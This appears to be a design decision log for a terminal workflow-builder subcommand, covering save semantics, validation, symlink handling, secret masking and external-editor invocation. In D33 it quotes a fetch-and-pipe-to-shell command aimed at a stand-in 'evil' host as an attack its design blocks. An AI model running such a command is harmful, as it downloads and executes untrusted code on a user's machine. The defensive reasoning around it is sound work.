# Decision Log: Workflow Builder

## D1: Subcommand name `pr9k workflow`

- **Question:** What command launches the workflow builder?
- **Decision:** The builder is invoked as `pr9k workflow` — a new cobra subcommand sibling to `pr9k sandbox create` and `pr9k sandbox login`.
- **Rationale:** The user explicitly specified this command. Follows the established subcommand pattern (sandbox create / sandbox login) and respects the narrow-reading ADR.
- **Evidence:** User input. Existing pattern at `src/cmd/pr9k/sandbox.go:80`, `src/cmd/pr9k/sandbox_create.go:19`, `src/cmd/pr9k/sandbox_login.go:16`. ADR [`docs/adr/20260409135303-cobra-cli-framework.md`](../../../adr/20260409135303-cobra-cli-framework.md).
- **Rejected alternatives:**
  - `pr9k edit` — rejected because "edit" says nothing about what is edited.
  - Flag on the root command — rejected because a full TUI differs materially from the run loop.
- **Linked technical notes:** —
- **Driven by findings:** —
- **Dependent decisions:** D3, D10, D19
- **Referenced in spec:** Actors and Triggers; Primary Flow step 1

## D2: Target selection modes — SUPERSEDED by D64

- **Status:** Superseded by [D64](#d64-menu-bar-target-selection-model) in review round 2.
- **Original question:** What options does the user have when choosing which workflow to edit?
- **Original decision:** Four options on a landing page — edit the default target in place; copy the default target into the project-local workflow directory and edit the copy; edit the project-local workflow; edit a workflow at an arbitrary path.
- **Why superseded:** The landing page was replaced with a menu-bar File menu (New / Open / Save / Quit) at the user's request in review round 2. The four landing-page options collapse into File > New (copy-from-default or empty scaffold) and File > Open (arbitrary config.json). See [D64](#d64-menu-bar-target-selection-model) for the replacement model.
- **Driven by findings:** F83 (round 2)
- **Referenced in spec:** historical only — spec references point to D64.

## D3: Default target resolution semantics

- **Question:** What does "the default target" mean now that the landing page is gone?
- **Decision:** The default-target resolution rule still applies, but its use shifts. It is consumed in two places under the menu-bar model: (a) when `--workflow-dir` is explicitly set on the command line, the builder auto-opens that file at launch (equivalent to an implicit File > Open); (b) the File > New and File > Open path pickers pre-fill their path input using the resolution, so the user can accept the default by pressing Enter. The resolution precedence is unchanged: `--workflow-dir` override if set, otherwise `<projectDir>/.pr9k/workflow/`, otherwise `<executableDir>/.pr9k/workflow/`.
- **Rationale:** Originally supported landing-page preselection. With the menu-bar model (D64), the same resolution provides sensible path-picker defaults and honors the `--workflow-dir` command-line override as an explicit user intent to open a specific file.
- **Evidence:** User input on Q1. User input on the menu-bar redesign (R2). `resolveWorkflowDir` / `resolveWorkflowDirWith` at `src/internal/cli/args.go:26-54`. ADR [`docs/adr/20260413162428-workflow-project-dir-split.md`](../../../adr/20260413162428-workflow-project-dir-split.md).
- **Rejected alternatives:**
  - Always auto-load the resolved default even without `--workflow-dir` — rejected because it silently decides what the user is editing; the empty-editor-with-hint state (D68) gives the user explicit control.
- **Linked technical notes:** —
- **Driven by findings:** F83
- **Dependent decisions:** D68, D69, D70
- **Referenced in spec:** Primary Flow steps 2, 5; File > New and File > Open flows

## D4: Read-only target — load-time detection

- **Question:** What happens when the target being loaded is not writable?
- **Decision:** The builder detects writability at File-menu load time — when File > Open resolves a path, when File > New confirms a destination path, and when `--workflow-dir` auto-opens at launch. If the resolved target is read-only, the builder surfaces a read-only banner in the session header and enters browse-only mode (D30). The check is uniform across all entry points — there is no separate code path for "default target" vs "arbitrary path."
- **Rationale:** In the landing-page model, the writability check happened before the edit view opened. In the menu-bar model, the check moves to the moment a file is loaded (New completion or Open completion). The behavior is unchanged — only the trigger point moved. Writability checks apply equally to the bundled default, the project-local workflow, and an arbitrary path, so the underlying logic is the same.
- **Evidence:** User input on Q1. User input on R2 menu-bar redesign. Go coding standard [`docs/coding-standards/go-patterns.md`](../../../coding-standards/go-patterns.md) — restrict file/directory permissions.
- **Rejected alternatives:**
  - Always write to a temporary location — violates user intent.
  - Refuse to open a read-only target — denies legitimate browse.
  - Per-entry-point writability logic — unnecessary complexity.
- **Linked technical notes:** —
- **Driven by findings:** F18, F24, F28, F83
- **Dependent decisions:** D30, D69, D70
- **Referenced in spec:** Primary Flow — file-load handling; Alternate Flows — Read-only target

## D5: External editor for multi-line content

- **Question:** Multi-line content — edit inside the TUI or shell out?
- **Decision:** Shell out to the user's configured external editor (see D16 for fallback policy, D33 for execution model).
- **Rationale:** No multi-line text-editor widget is in the project's existing TUI dependency stack. Shell-out is the established Unix pattern (`git commit`, `crontab -e`, `visudo`).
- **Evidence:** User input on Q2. `src/go.mod` — no `bubbles/textarea`, no `charmbracelet/huh`.
- **Rejected alternatives:**
  - Build an in-TUI multi-line editor — out of scope.
  - Pager-style read-only view — user must be able to edit.
  - Adopt `charmbracelet/huh` — overcommitment for a single-feature need.
- **Linked technical notes:** T2
- **Driven by findings:** —
- **Dependent decisions:** D16, D33
- **Referenced in spec:** Primary Flow step 7; Alternate Flows — External-editor invocation

## D6: Validation UX — fatal blocks, warnings do not

- **Question:** When does the builder validate, and what severity blocks the save?
- **Decision:** Validation runs on save against the in-memory state. Fatal findings block; warnings and info do not (the user acknowledges; see D23 for per-session suppression). Field-local input-time validation still applies to numeric ranges and simple enums.
- **Rationale:** Mirrors the validator's existing severity model.
- **Evidence:** User input on Q3. Validator severity levels at `src/internal/validator/validator.go:21-55`. `docs/code-packages/validator.md`.
- **Rejected alternatives:**
  - Continuous validation — many rules require whole-config scope.
  - Warnings block save — the runtime does not.
- **Linked technical notes:** T3
- **Driven by findings:** —
- **Dependent decisions:** D14, D23, D25, D35
- **Referenced in spec:** Primary Flow step 9; Coordinations — Workflow configuration validator

## D7: Save semantics — explicit, atomic, unsaved prompt

- **Question:** Auto-save or explicit? Atomic or direct? Quit-with-unsaved behavior?
- **Decision:** Explicit save. Atomic at the file level (see T1). Quit with unsaved changes invokes a three-way confirmation dialog (save/discard/cancel). No auto-save, no undo history.
- **Rationale:** The editor is the canonical editing path and deserves crash-safe writes. Explicit matches the validator integration.
- **Evidence:** User input on Q4. Existing write patterns at `src/internal/workflow/iterationlog.go:47` and `src/internal/claudestream/rawwriter.go:29` — no atomic-rename pattern in the codebase today.
- **Rejected alternatives:**
  - Auto-save on every keystroke.
  - Direct `O_TRUNC` overwrite.
  - `.bak` sibling.
- **Linked technical notes:** T1
- **Driven by findings:** —
- **Dependent decisions:** D40
- **Referenced in spec:** Primary Flow steps 9 and 10; Alternate Flows — Unsaved-changes quit

## D8: Scaffold or copy or cancel for empty folder — SUPERSEDED by D69

- **Status:** Superseded by [D69](#d69-file--new-flow) in review round 2.
- **Original question:** When the user selects a target folder that has no configuration file, what does the builder do?
- **Original decision:** Three actions — scaffold a minimal valid workflow; copy from the default target; cancel.
- **Why superseded:** The scaffold-vs-copy-default choice moves into File > New, where it is presented as the first choice before the user picks a destination path. The "cancel" option returns to the empty-editor hint state rather than to the removed landing page. See [D69](#d69-file--new-flow).
- **Driven by findings:** F83
- **Referenced in spec:** historical only — spec references point to D69.

## D9: v1 scope boundary

- **Question:** What is out of scope for v1?
- **Decision:** v1 does not run workflows, dry-run steps, import from URLs / git, diff, lock across sessions, syntax-highlight, perform version-control operations, migrate older schemas, or embed step templates.
- **Rationale:** User input on Q6. Each excluded capability is a substantial feature; bundling dilutes the editing value.
- **Evidence:** User input on Q6. Narrow-reading ADR [`docs/adr/20260410170952-narrow-reading-principle.md`](../../../adr/20260410170952-narrow-reading-principle.md).
- **Rejected alternatives:**
  - Include dry-run.
  - Include diff-against-default.
- **Linked technical notes:** —
- **Driven by findings:** —
- **Dependent decisions:** D18, D41
- **Referenced in spec:** Out of Scope

## D10: Editor does not run or coordinate with orchestrator

- **Question:** Does the builder interact with a running pr9k orchestrator?
- **Decision:** No. The builder is a distinct subcommand with its own TUI program lifecycle.
- **Rationale:** User input on Q7. Clean subcommand separation matches the sandbox-subcommand precedent.
- **Evidence:** User input on Q7. Sandbox subcommand separation at `src/cmd/pr9k/sandbox.go:80`.
- **Rejected alternatives:**
  - Attach to a running orchestrator.
  - Signal an orchestrator after save.
- **Linked technical notes:** —
- **Driven by findings:** —
- **Dependent decisions:** D41
- **Referenced in spec:** Edge Cases — another pr9k process; Coordinations — Main pr9k orchestrator; Out of Scope

## D11: No Ralph-specific knowledge in the builder

- **Question:** Should the builder know anything Ralph-specific?
- **Decision:** No. The builder is a pure schema editor. It knows the `config.json` schema (owned by Go's validator) but does not hardcode step templates, prompt paths, script paths, or capture-variable names. The three phase names (`initialize`/`iteration`/`finalize`) are explicitly named by the narrow-reading ADR as owned by pr9k Go code — rendering them in the outline is an expression of that ownership, not a violation of it.
- **Rationale:** The narrow-reading ADR makes this the default posture. D11 is grounded in the ADR's "pr9k owns" list.
- **Evidence:** ADR [`docs/adr/20260410170952-narrow-reading-principle.md`](../../../adr/20260410170952-narrow-reading-principle.md) "pr9k owns" vs "Config owns" split.
- **Rejected alternatives:**
  - Step-template gallery — requires amending the ADR.
  - `--ralph` flag.
- **Linked technical notes:** —
- **Driven by findings:** F20
- **Dependent decisions:** —
- **Referenced in spec:** Out of Scope (final bullet)

## D12: Constrained fields as choice lists; model as free text with suggestions

- **Question:** How is each field type rendered?
- **Decision:** Fixed-value fields render as choice lists offering only valid values. Numeric fields enforce ranges at input. Plain-text fields have input hints. `model` is free-text with a suggestion list because the schema does not constrain it.
- **Rationale:** User asked explicitly for constrained lists. The builder must not reject a value the runtime would accept.
- **Evidence:** User input. Constrained-value catalog at `src/internal/validator/validator.go`: `captureMode` (406–416), `onTimeout` (459–499), `statusLine.type` (261–263). Model not validated (371–372).
- **Rejected alternatives:**
  - `model` as a fixed list.
  - All fields as free text.
- **Linked technical notes:** —
- **Driven by findings:** —
- **Dependent decisions:** D27
- **Referenced in spec:** Primary Flow step 7

## D13: Keyboard and mouse both supported

- **Question:** What input modalities does the builder support?
- **Decision:** Keyboard and mouse are both first-class. Every action is reachable by both.
- **Rationale:** User stated explicitly "mouse and keyboard integration".
- **Evidence:** User input. Existing mouse handling at `src/internal/ui/model.go:217`. `tea.WithMouseCellMotion()` at `src/cmd/pr9k/main.go:175`.
- **Rejected alternatives:**
  - Keyboard-only v1.
- **Linked technical notes:** —
- **Driven by findings:** —
- **Dependent decisions:** D34
- **Referenced in spec:** Primary Flow step 7; User Interactions — Affordances

## D14: Reuse existing validator

- **Question:** Does the builder write a new validator or reuse the existing one?
- **Decision:** Reuse the existing validator. The builder passes its in-memory state to the same validator the main command uses.
- **Rationale:** Avoids the "editor said fine but pr9k rejected it" failure mode. ADR narrow-reading says pr9k owns schema validation.
- **Evidence:** `src/internal/validator/validator.go`. `docs/code-packages/validator.md`.
- **Rejected alternatives:**
  - Builder-local validator.
  - Partial validation.
- **Linked technical notes:** T3
- **Driven by findings:** F30
- **Dependent decisions:** D21
- **Referenced in spec:** Primary Flow step 9; Coordinations — Workflow configuration validator

## D15: Companion-file copy scope

- **Question:** When copying the default target, which companion files get copied?
- **Decision:** Configuration file, every prompt file referenced by any step, every script file referenced by any step, AND the script referenced by the top-level `statusLine.command` field when a `statusLine` block is present. Unreferenced files are not copied.
- **Rationale:** Avoids surprising the user with orphan files, while ensuring the copy is self-sufficient. The original phrasing omitted the `statusLine` script because it named only "steps" — a copy of a default-with-statusLine bundle would have produced a broken copy that fails validation on first load. Adversarial-validator round 1 (F51) caught this by cross-referencing the default bundle's ship-state against the copy rule.
- **Evidence:** Default bundle layout at `workflow/` — the bundled default ships a `statusLine` block pointing at `scripts/statusline`. Validator `statusLine` block at `src/internal/validator/validator.go:259-273`. Narrow-reading ADR — config is the source of truth.
- **Rejected alternatives:**
  - Copy full directory tree.
  - Copy only the config file.
  - Copy without the statusLine script.
- **Linked technical notes:** —
- **Driven by findings:** F13, F51
- **Dependent decisions:** D32
- **Referenced in spec:** Alternate Flows — Copy-default-to-local

## D16: External editor fallback policy

- **Question:** When neither `$VISUAL` nor `$EDITOR` is set, does the builder silently fall back to a default editor?
- **Decision:** No silent fallback. When neither is set, the builder shows a dialog with the file's absolute path and a copy-pasteable `export VISUAL=nano` instruction. Users can close the dialog and continue editing non-multi-line fields.
- **Rationale:** Silent fallback to `vi` traps users who do not know the exit sequence. An explicit dialog is kinder for new users on minimal installs.
- **Evidence:** User input on Q-A. UX finding UX-009 / DevOps Finding 8: the spec's earlier language was contradictory — "safe fallback if neither is set" conflicted with the "no external editor configured" alternate flow.
- **Rejected alternatives:**
  - Hard fallback to `vi` — traps vi-unfamiliar users.
  - Probe `nano` / `vi` in order — introduces surprise-editor failure modes on minimal containers.
- **Linked technical notes:** T2
- **Driven by findings:** F9
- **Dependent decisions:** D33
- **Referenced in spec:** Primary Flow step 7; Alternate Flows — External-editor invocation, No external editor configured

## D17: Symlink policy — follow with visibility

- **Question:** How does the builder handle symlinks in the target directory and its companion files?
- **Decision:** Follow symlinks (matching the existing `src/internal/cli/args.go` precedent for `--workflow-dir` and `--project-dir`), and display a "symlink banner" during the session naming each affected path. The first save requires explicit confirmation. Saves to a symlinked configuration file write through the symlink to its target rather than replacing the symlink with a regular file.
- **Rationale:** User input on Q-B. Rejecting symlinks would break legitimate uses (a user who symlinks their bundle into `.pr9k/workflow/` from elsewhere). Silent following creates an invisible attack surface. Visibility-plus-confirmation balances the two.
- **Evidence:** User input on Q-B. `EvalSymlinks` usage at `src/internal/cli/args.go:50, 101, 118`. Security-F4. Edge-case 3-A, 3-E, 4-D.
- **Rejected alternatives:**
  - Reject symlinks that escape the tree.
  - Follow silently.
- **Linked technical notes:** T1 (follow-symlink save semantics)
- **Driven by findings:** F24, F26, F27, F38
- **Dependent decisions:** —
- **Referenced in spec:** Alternate Flows — Symlinked target or companion file; Edge Cases table (target config file is a symlink)

## D18: Unknown fields — warn on load, drop on save

- **Question:** What does the builder do when `config.json` contains fields the builder's schema model does not recognize?
- **Decision:** At load, surface a non-blocking banner listing unrecognized fields and warning that saving will remove them. At save, write only fields the builder knows about — unrecognized fields are dropped.
- **Rationale:** User chose option B from Q-C. Preserving unknowns (option A) would require an "extras" bag in the in-memory model and round-trip guarantees the builder cannot reliably validate. Blocking save (option C) would paralyze the user on any schema drift. The warn-then-drop model keeps the user informed without forcing them to reason about fields they did not author.
- **Evidence:** User input on Q-C. DevOps Finding 6.
- **Rejected alternatives:**
  - Preserve unknowns through load/save (option A) — adds in-memory state not otherwise needed.
  - Block save on unknowns (option C) — disproportionate to the risk.
- **Linked technical notes:** —
- **Driven by findings:** F44
- **Dependent decisions:** —
- **Referenced in spec:** Alternate Flows — Unknown-field warning; Out of Scope

## D19: Subcommand flag surface

- **Question:** Which root-command flags does `pr9k workflow` accept?
- **Decision:** `--workflow-dir` and `--project-dir`, with identical semantics to the main command. The subcommand does not accept `--iterations` (meaningless outside a run) or any other run-scoped flag. `--version` and `-h`/`--help` are handled by cobra globally and remain available.
- **Rationale:** Target resolution depends on these two flags; run-time flags do not apply to editing.
- **Evidence:** Existing flags at `src/internal/cli/args.go` and `docs/features/cli-configuration.md`.
- **Rejected alternatives:**
  - Inherit all root flags — `--iterations` would be nonsense.
  - New subcommand-local flag set — unnecessary divergence.
- **Linked technical notes:** —
- **Driven by findings:** F19
- **Dependent decisions:** —
- **Referenced in spec:** Actors and Triggers

## D20: containerEnv secret masking

- **Question:** How does the builder display container-environment values whose key names match secret patterns?
- **Decision:** Mask by default with a reveal toggle per field. Secret-key patterns match the existing validator list: keys ending in `_TOKEN`, `_SECRET`, `_KEY`, `_PASSWORD`, `_PASSPHRASE`, `_CREDENTIAL`, `_APIKEY`. Findings-panel entries for secret-named keys never echo the value.
- **Rationale:** User input on Q-D, option A. Defense in depth: the validator already warns that literal values end up committed to the repo; masking the value on screen avoids shoulder-surfing and inadvertent inclusion in screenshots or screen shares. Reveal-on-demand preserves editability.
- **Evidence:** User input on Q-D. Secret-pattern list at `src/internal/validator/validator.go:236-244`. Security-F3.
- **Rejected alternatives:**
  - Mask only when warning fires — timing is too late; the value is already visible.
  - Never mask.
- **Linked technical notes:** —
- **Driven by findings:** F37
- **Dependent decisions:** —
- **Referenced in spec:** Primary Flow step 7

## D21: Script executability validation

- **Question:** Does the builder (or the validator) enforce that referenced scripts are executable and have a valid shebang?
- **Decision:** Extend the validator with a new category: every referenced script must be a regular file, must be executable, and must begin with a `#!` shebang (or be an OS-native executable format). Violation is fatal. When the only problem is a missing execute bit and the file has a valid shebang, the builder's detail pane offers a "mark executable and continue" action that sets the execute bit for the user, then re-runs validation.
- **Rationale:** User input on Q-E (option A with chmod offer). The existing validator only checks that the path exists, so a non-executable script passes validation and fails at runtime — silent misbehavior. Treating executability as a schema-level rule (owned by the validator) is narrow-reading-friendly. The chmod offer removes friction for the common case where the user forgot to set the bit.
- **Evidence:** User input on Q-E. Existing `validateCommandPath` at `src/internal/validator/validator.go:641-659` — currently checks existence only. Edge-case 3-B, 3-F.
- **Rejected alternatives:**
  - Builder-local check, validator unchanged — creates drift.
  - No check — keeps the silent misbehavior.
- **Linked technical notes:** —
- **Driven by findings:** F26
- **Dependent decisions:** —
- **Referenced in spec:** Edge Cases table (script row)

## D22: External-workflow warning

- **Question:** When the loaded target is outside the user's project and home, does the builder treat it differently?
- **Decision:** Yes. When File > Open (or File > New with an external destination, or `--workflow-dir` auto-open) resolves a path outside the user's project directory and home directory, the builder displays an "external workflow" banner in the session header for the entire session. At the first save, prompt for explicit confirmation with the absolute path. Subsequent saves in the same session do not re-confirm.
- **Rationale:** User input on Q-G (option A) and R2 menu-bar redesign. A workflow the user later runs executes scripts on the host with the user's privileges; editing an attacker-placed workflow at `/tmp/evil/` should be visibly distinct from editing one's own. The detection point moved from landing-page selection to File-menu load completion, but the protection is unchanged.
- **Evidence:** User input on Q-G. User input on R2. Security-F1. Existing `resolveProjectDir` at `src/internal/cli/args.go:59`.
- **Rejected alternatives:**
  - Banner only — insufficient for the save action itself.
  - No visible treatment — denies the user informed consent.
- **Linked technical notes:** —
- **Driven by findings:** F35, F83
- **Dependent decisions:** D69, D70
- **Referenced in spec:** Primary Flow — file-load handling; Alternate Flows — External-workflow session

## D23: Per-session warning suppression

- **Question:** Does every save with the same warning force a fresh acknowledgment?
- **Decision:** No. A warning or info finding acknowledged during a session is not surfaced again at the acknowledgment dialog for the remainder of the session. The finding continues to appear in the findings panel when the user opens it manually.
- **Rationale:** User input on Q-H (option A). Repeated acknowledgment of the same non-fatal warning trains users to click through without reading — a classic warning-fatigue failure. Matching the runtime (warnings print once at startup) keeps user expectations aligned.
- **Evidence:** User input on Q-H. UX-017.
- **Rejected alternatives:**
  - Always require acknowledgment — dark-pattern territory.
- **Linked technical notes:** —
- **Driven by findings:** F16
- **Dependent decisions:** —
- **Referenced in spec:** Primary Flow step 9

## D24: Help modal and shortcut footer

- **Question:** How does the user discover the builder's keyboard shortcuts?
- **Decision:** A persistent **shortcut footer** in every edit-view mode shows the shortcuts available in the current focus. A **help modal** is unconditionally reachable via `?` from any edit-view mode (not gated on status-line configuration).
- **Rationale:** UX-002 and UX-015. The existing TUI's `?` gate on `statusLineActive` is already a defect; the builder must not inherit it. A richer editor with many shortcuts needs an always-available discovery surface.
- **Evidence:** UX findings UX-002, UX-015. Existing shortcut constants at `src/internal/ui/ui.go:35-44`. Existing `?` / `statusLineActive` gate at `src/internal/ui/keys.go:81` (the defect the builder must not inherit — the `keys.go` location, not `ui.go:81`, which is the `handleError` case).
- **Rejected alternatives:**
  - Gate `?` on some other condition.
  - Documentation-only shortcut list.
- **Linked technical notes:** —
- **Driven by findings:** F2, F14
- **Dependent decisions:** —
- **Referenced in spec:** Primary Flow steps 5 and 8; User Interactions — Feedback

## D25: Severity text prefixes

- **Question:** How is finding severity conveyed to users with color-vision limitations or color-stripping terminals?
- **Decision:** Every finding in the findings panel carries a text-mode severity prefix — `[FATAL]`, `[WARN]`, `[INFO]` — alongside any color. Severity is never conveyed by color alone.
- **Rationale:** Universal Design Principle 4. UX-001 and Security-F6.
- **Evidence:** Existing marker-glyph pattern for step state at `src/internal/ui/header.go:242-256` — color plus glyph.
- **Rejected alternatives:**
  - Color-only.
  - Glyph-only.
- **Linked technical notes:** —
- **Driven by findings:** F1
- **Dependent decisions:** —
- **Referenced in spec:** Primary Flow step 9

## D26: Initial cursor focus

- **Question:** Which item is focused when the edit view first opens?
- **Decision:** The cursor is placed on the first step of the **iteration phase** when the phase has at least one step. If the iteration phase is empty, the cursor falls back to the first step of the first non-empty phase in the order initialize → iteration → finalize; if all three phases are empty (only possible transiently before the scaffold-from-empty placeholder is added — the validator forbids a saved workflow with zero iteration steps), the cursor is placed on the iteration phase header.
- **Rationale:** The validator requires iteration to have at least one step (category 3 phase-size rule), so the "iteration has a step" branch is the common case for any valid loaded workflow. Placing the cursor there keeps the first keystroke productive without encoding Ralph-specific knowledge: the preference for iteration is grounded in the schema's own invariant (iteration is the only always-non-empty phase), not in any assumption about how Ralph-shaped workflows distribute their edits. An earlier draft grounded this decision in "iteration is the most-edited phase" — adversarial review (F52) correctly flagged that claim as a behavioral assertion about users without codebase evidence and as Ralph-specific knowledge the builder should not bake in. The schema-grounded rationale above replaces it.
- **Evidence:** UX-004. Validator minimum-phase-size rule at `src/internal/validator/validator.go` (category 3) — iteration must have at least one step.
- **Rejected alternatives:**
  - No initial focus.
  - Focus on the first section header regardless.
  - Retain the "most-edited phase" rationale — rejected as unfalsifiable and as a narrow-reading violation.
- **Linked technical notes:** —
- **Driven by findings:** F4, F52
- **Dependent decisions:** —
- **Referenced in spec:** Primary Flow step 6

## D27: Unfocused field signifiers

- **Question:** How are constrained fields distinguishable from free-text fields when unfocused?
- **Decision:** Constrained fields render with a trailing `▾` glyph next to their current value. Free-text and free-text-with-suggestions fields render without the glyph.
- **Rationale:** UX-007. Single-glyph recognition cue avoids forcing the user to focus each field to learn its type.
- **Evidence:** UX-007.
- **Rejected alternatives:**
  - Distinguish only when focused.
  - Use a label prefix.
- **Linked technical notes:** —
- **Driven by findings:** F7
- **Dependent decisions:** —
- **Referenced in spec:** Primary Flow step 7

## D28: Collapsible section behavior

- **Question:** How does the outline's collapsible sections behave?
- **Decision:** All sections start expanded on first load of the edit view. The item count chip on each section header is always visible. Collapsing a section with the cursor inside moves the cursor to the section header. The detail pane shows a section summary (counts, top-level field values) when a section header is focused. Collapse state persists for the duration of the session but not across sessions.
- **Rationale:** UX-012. Predictable state transitions on a wayfinding affordance.
- **Evidence:** UX-012.
- **Rejected alternatives:**
  - Collapse state persisted across sessions — per-user preference complexity not justified in v1.
  - Initial state collapsed — defeats discoverability.
- **Linked technical notes:** —
- **Driven by findings:** F12
- **Dependent decisions:** —
- **Referenced in spec:** Primary Flow step 5

## D29: Outline scrollability

- **Question:** How does the outline handle more items than fit in the viewport?
- **Decision:** The outline is independently scrollable with a visible scroll-position indicator when content exceeds viewport height. Keyboard navigation (arrow keys) auto-scrolls to keep the focused item visible.
- **Rationale:** UX-016. A workflow with many steps outgrows the viewport; silently truncated content is a severe visibility failure.
- **Evidence:** UX-016. Existing viewport pattern at `src/internal/ui/log_panel.go:39` (bubbles/viewport).
- **Rejected alternatives:**
  - Pagination with explicit page controls — less smooth than continuous scroll.
  - Unbounded rendering — breaks on tall workflows.
- **Linked technical notes:** —
- **Driven by findings:** F15, F47
- **Dependent decisions:** —
- **Referenced in spec:** Primary Flow step 5

## D30: Read-only targets open in browse-only mode

- **Question:** When a loaded target is read-only, is it opened for edit (with save disabled) or for browse (with edit hidden)?
- **Decision:** Browse-only mode. The edit view opens with the same layout as the editable view, but the File > Save menu item is greyed out and its shortcut is inert, unsaved-change tracking is disabled, and the session header shows a prominent "read-only" indicator. (File > New and File > Open remain available; the user can open a writable copy via New > "copy from default" without losing their place.)
- **Rationale:** Jr-F3. Offering a save affordance that cannot succeed at save time is a broken promise. Under the menu-bar model (R2), "hiding the save affordance" is achieved by greying out the File > Save menu item rather than removing an edit-view save button, because the menu item exists as a persistent surface. The user sees clearly that Save is unavailable, and File > New and File > Open give them an escape hatch without quitting.
- **Evidence:** Jr-F3. User input on R2 menu-bar redesign.
- **Rejected alternatives:**
  - Edit-with-active-save that fails at save time.
  - Refuse to open read-only files — denies legitimate browsing.
  - Remove the File menu entirely in browse-only mode — loses the escape hatch to New/Open.
- **Linked technical notes:** —
- **Driven by findings:** F18, F83
- **Dependent decisions:** —
- **Referenced in spec:** Primary Flow — file-load handling; Alternate Flows — Read-only target

## D31: Landing page duplicate-option suppression — SUPERSEDED by D64

- **Status:** Superseded by [D64](#d64-menu-bar-target-selection-model) in review round 2 (the landing page is gone, so there are no options to deduplicate).
- **Original question:** When two landing-page options resolve to the same directory, does the builder show both?
- **Original decision:** Collapse duplicates, show only the more specific label.
- **Why superseded:** The landing page was replaced by the File menu. Path-level discoverability is handled by the path picker's pre-filled default path, not by landing-page option labels.
- **Driven by findings:** F3, F83
- **Referenced in spec:** historical only.

## D32: Copy progress and partial-failure handling

- **Question:** What does the user see during the copy-default-to-local operation, and what happens if it fails part-way?
- **Decision:** Display a brief status indicator during the copy. If any file fails to copy (permission denied, disk full), roll back the partial copy and return to the landing page with an error message naming the failed file and reason. Do not enter edit view with a partial bundle.
- **Rationale:** UX-013. A partial copy manifesting as "referenced prompt file not found" in the detail pane would confuse the user who just selected the copy path to get a complete bundle.
- **Evidence:** UX-013.
- **Rejected alternatives:**
  - Silent copy with no feedback.
  - Enter edit view with a partial bundle.
- **Linked technical notes:** —
- **Driven by findings:** F13
- **Dependent decisions:** —
- **Referenced in spec:** Alternate Flows — Copy-default-to-local

## D33: Editor execution model

- **Question:** How is the `$VISUAL` / `$EDITOR` value parsed and invoked?
- **Decision:** Parse the value with shell-style word splitting (first token is the command, remaining tokens are arguments). Reject values containing characters that would be interpreted by a shell but have no meaning under direct exec: backticks, `;`, `|`, `&`, `<`, `>`, newline. `$` is **not** rejected — under direct exec (no `sh -c`), `$` is a literal character with no meaning, and legitimate user values like `VISUAL='$HOME/bin/myvim'` (single-quoted in the user's shell so the variable never expands) are valid program paths that must work. Reject relative paths that do not resolve via `PATH` to an existing executable. Invoke the editor directly via the OS exec mechanism, not via `sh -c`.
- **Rationale:** Security-F2. Direct exec with whitespace-split handles the realistic case (`VISUAL="code --wait"`) without introducing shell injection. The two principal attack vectors (`VISUAL="curl http://evil | sh"` and `VISUAL="./planted-binary"`) are closed by the `|` rejection and the path check — `$` rejection is redundant for those and wrongly rejects legitimate literal-`$` paths. Adversarial review (F53) caught the overcautious `$` rejection.
- **Evidence:** Security-F2. Edge-case 5-A, 5-E. Adversarial-validator F53.
- **Rejected alternatives:**
  - `sh -c $VISUAL "$@"` — command injection surface.
  - Treat whole value as program name — breaks common `VISUAL="vim -u NONE"` pattern.
  - Reject `$` along with other metacharacters — rejected because direct exec does not interpret `$`.
- **Linked technical notes:** T2
- **Driven by findings:** F8, F9, F29, F36, F53
- **Dependent decisions:** —
- **Referenced in spec:** Alternate Flows — External-editor invocation, Editor binary cannot be spawned

## D34: Step reorder UX

- **Question:** How does the user discover and perform step reordering?
- **Decision:** Each step row in the outline shows a persistent gripper glyph (`⋮⋮`) at its left edge. Keyboard reorder supports two paths: primary is `Alt+↑` / `Alt+↓` (mirrors VS Code / JetBrains); fallback is a **reorder mode** entered by pressing `r` on a focused step — `↑`/`↓` move the step while reorder mode is active, `Enter` commits, `Esc` cancels. The fallback exists because `Alt` as a modifier is intercepted by many tmux setups (tmux's default `escape-time` converts `Alt+key` to `Esc key` two-event sequence), mosh, and some SSH clients. Mouse drag on the gripper glyph (or anywhere on the row) also reorders. Cross-phase drag is not supported — dragging a step past a phase boundary visibly drops it at the phase's edge. The reorder viewport auto-scrolls to keep the moving step visible when it crosses the viewport boundary. The gripper uses `⋮⋮` (U+22EE twice), which has broader terminal-font coverage than Braille block glyphs like `⠿` (U+283F).
- **Rationale:** UX-005 drove the persistent gripper and keyboard shortcut. Adversarial review (F54) verified that `⠿` (Braille pattern) requires font support not guaranteed on Windows default fonts, macOS San Francisco, or minimal container environments — falling back to a vertical-ellipsis pair (`⋮⋮`) keeps the signifier affordance on terminals the main pr9k command already supports. UX round 2 (F55) surfaced that the sole `Alt+↑/↓` binding silently breaks under the exact environment the spec itself recommends for long sessions (tmux per the SIGHUP mitigation), so a non-modifier fallback is required. The reorder-mode pattern (press key, enter mode, move with arrows, commit/cancel) is a common TUI convention and does not collide with in-field text input (which never sees `r` bare — text fields consume `r` as a character, and the reorder-mode trigger fires only when a step row is focused in the outline). Viewport auto-scroll on reorder (per F60) extends D29's navigation-auto-scroll to reorder keys so a user moving a step past the fold does not lose visual contact. Cross-phase move remains out of scope to avoid `captureAs` scope landmines.
- **Evidence:** UX-005, UX-004 (Alt fragility under tmux), Edge-case 8-B. Unicode block coverage — U+283F is in the Braille Patterns block (U+2800–U+28FF), U+22EE is in the Mathematical Operators block, universally present in monospace fonts.
- **Rejected alternatives:**
  - Hover-only gripper — invisible in terminals.
  - Single-key reorder (`[`/`]`) — collides with text-input fields.
  - Braille gripper `⠿` — font coverage risk.
  - `Alt+↑/↓` only, no fallback — silently broken under tmux.
  - Allow cross-phase drag — scope creep and semantic trap for the user.
- **Linked technical notes:** —
- **Driven by findings:** F5, F32, F54, F55, F60
- **Dependent decisions:** —
- **Referenced in spec:** Primary Flow step 7; User Interactions — Affordances

## D35: Findings panel lifecycle

- **Question:** What happens to the findings panel after the user jumps to a field and fixes a fatal finding?
- **Decision:** The panel stays visible as a sidebar while the user edits. Jumping to a field from the panel moves focus to the edit view; the panel stays open. Every subsequent save rebuilds the panel from the new validator output. When all fatals are resolved and save succeeds, the panel closes automatically. The user can also dismiss the panel manually at any time.
- **Rationale:** UX-006. Closing the panel after jump or forcing a new save-invocation round trip adds friction; staying open while the user fixes findings is the lower-effort loop.
- **Evidence:** UX-006.
- **Rejected alternatives:**
  - Panel closes on jump.
  - Panel must be re-opened to see progress.
- **Linked technical notes:** —
- **Driven by findings:** F6
- **Dependent decisions:** —
- **Referenced in spec:** Primary Flow step 9

## D36: Parse-error recovery reload

